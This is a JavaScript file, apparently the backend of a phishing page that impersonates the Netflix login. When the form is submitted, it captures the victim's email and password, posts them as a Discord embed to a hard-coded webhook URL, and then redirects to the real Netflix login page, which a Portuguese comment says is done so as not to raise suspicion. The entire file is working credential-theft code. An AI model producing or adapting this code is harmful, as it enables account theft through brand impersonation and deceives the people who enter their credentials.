const webhookURL = "https://discord.com/api/webhooks/1481402603404525678/LDGdRvAZJZEbG22rhkms1kmKt1XQ4oglVGE_cYOu0qWRi-y_fjE0GjZ8oAe2jwi28WI1";

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const btnSubmit = document.getElementById('btnSubmit');

    // Feedback visual simples
    btnSubmit.innerText = "Carregando...";
    btnSubmit.disabled = true;

    // Estrutura do Embed para o Discord
    const payload = {
        embeds: [{
            title: "🛑 NOVO ACESSO DETECTADO - NETFLIX 🛑",
            color: 15158332, // Vermelho Netflix
            fields: [
                {
                    name: "📧 E-mail / Usuário",
                    value: `\`${email}\``,
                    inline: false
                },
                {
                    name: "🔑 Senha",
                    value: `\`${password}\``,
                    inline: false
                }
            ],
            footer: {
                text: "Painel de Monitoramento Shelby",
                icon_url: "https://cdn-icons-png.flaticon.com/512/732/732228.png"
            },
            timestamp: new Date()
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(() => {
        // Redireciona para o site oficial após o envio para não gerar suspeitas
        window.location.href = "https://www.netflix.com/br/login";
    })
    .catch((err) => {
        console.error('Erro ao enviar:', err);
        alert('Ocorreu um erro na conexão. Tente novamente.');
        btnSubmit.innerText = "Continuar";
        btnSubmit.disabled = false;
    });
});
